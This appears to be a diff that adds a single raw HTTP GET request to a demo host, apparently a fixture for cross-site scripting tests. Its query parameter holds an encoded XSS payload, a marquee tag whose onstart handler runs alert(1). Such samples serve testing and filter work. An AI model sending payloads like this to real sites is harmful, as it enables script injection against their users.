@@ -1,0 +1,4 @@
+GET /a?page=%26lt;marquee%20onstart%3Dalert(1)%26gt;x%26lt;/marquee%26gt; HTTP/1.1
+Host: demo.example.com
+Connection: close
+
